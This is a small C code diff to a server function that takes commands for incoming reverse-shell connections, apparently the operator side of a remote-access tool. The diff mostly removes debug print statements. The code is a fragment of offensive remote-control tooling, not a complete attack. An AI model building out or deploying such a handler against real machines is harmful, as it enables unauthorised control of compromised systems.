@@ -27,11 +27,8 @@
 
 
 int listening_server_action(int new_socket, int readPipe){
-  printf("ready to take command of the new reverse shell that just connected...\n");
-
   struct init_struct init;
   read(new_socket, &init, sizeof(struct  init_struct));
-  printf("RECIEVED CONNECTION!...\n");
   print_init_struct(&init);
   int fds[2];
   pipe(fds);
@@ -49,9 +46,6 @@ int listening_server_action(int new_socket, int readPipe){
       int msg_size = (strlen(message)+1) * sizeof(char);
 
       int write_result=write(new_socket, message, msg_size);
-      perror(write_result == -1?"WRITE TO SOCKET ERR":"kol tov");
-
-      printf("message: %s %d\n", message, msg_size);
     }
   }
   // If parent, just read from socket
@@ -60,7 +54,7 @@ int listening_server_action(int new_socket, int readPipe){
       char connection[MESSAGE_LENGTH] = "";
       int bytes;
       while(bytes = read(new_socket, connection, MESSAGE_LENGTH)){
-        printf("\n<<CONNECTION>> %d: %s\n",bytes, connection);
+        printf("%s\n",connection);
         memset(connection, 0, sizeof(connection));
       }
     }
